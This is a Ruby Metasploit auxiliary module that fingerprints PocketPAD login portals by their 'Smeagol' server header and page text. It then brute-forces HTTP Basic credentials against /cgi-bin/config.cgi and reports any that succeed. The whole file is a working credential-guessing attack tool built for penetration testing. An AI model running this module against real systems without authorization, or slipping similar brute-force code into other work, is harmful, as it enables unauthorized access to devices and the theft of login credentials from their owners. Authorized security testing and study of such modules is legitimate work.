##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
    'Name'           => 'PocketPAD Login Bruteforce Force Utility',
    'Description'    => %{
      This module scans for PocketPAD login portal, and
      performs a login bruteforce attack to identify valid credentials.
    },
    'Author'         =>
      [
        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
      ],
    'License'        => MSF_LICENSE
    ))
  end

  def run_host(ip)
    unless is_app_popad?
      return
    end

    print_status("#{peer} - Starting login bruteforce...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't PocketPAD
  #

  def is_app_popad?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("#{peer} - HTTP Connection Failed...")
      return false
    end

    if res && res.code == 200 && res.headers['Server'] && res.headers['Server'].include?("Smeagol") && res.body.include?("PocketPAD")
      vprint_good("#{peer} - Running PocketPAD application ...")
      return true
    else
      vprint_error("#{peer} - Application is not PocketPAD. Module will not continue.")
      return false
    end
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/cgi-bin/config.cgi',
        'method'    => 'POST',
        'authorization' => basic_auth(user,pass),
        'vars_post'    => {
          'file' => "configindex.html"
          }
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{peer} - HTTP Connection Failed...")
      return :abort
    end

    if (res && res.code == 200 && res.body.include?("Home Page") && res.headers['Server'] && res.headers['Server'].include?("Smeagol"))
      print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_hash = {
        :host   => rhost,
        :port   => rport,
        :sname  => 'PocketPAD Portal',
        :user   => user,
        :pass   => pass,
        :active => true,
        :type => 'password'
      }
      report_auth_info(report_hash)
      return :next_user
    else
      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end
  end
end
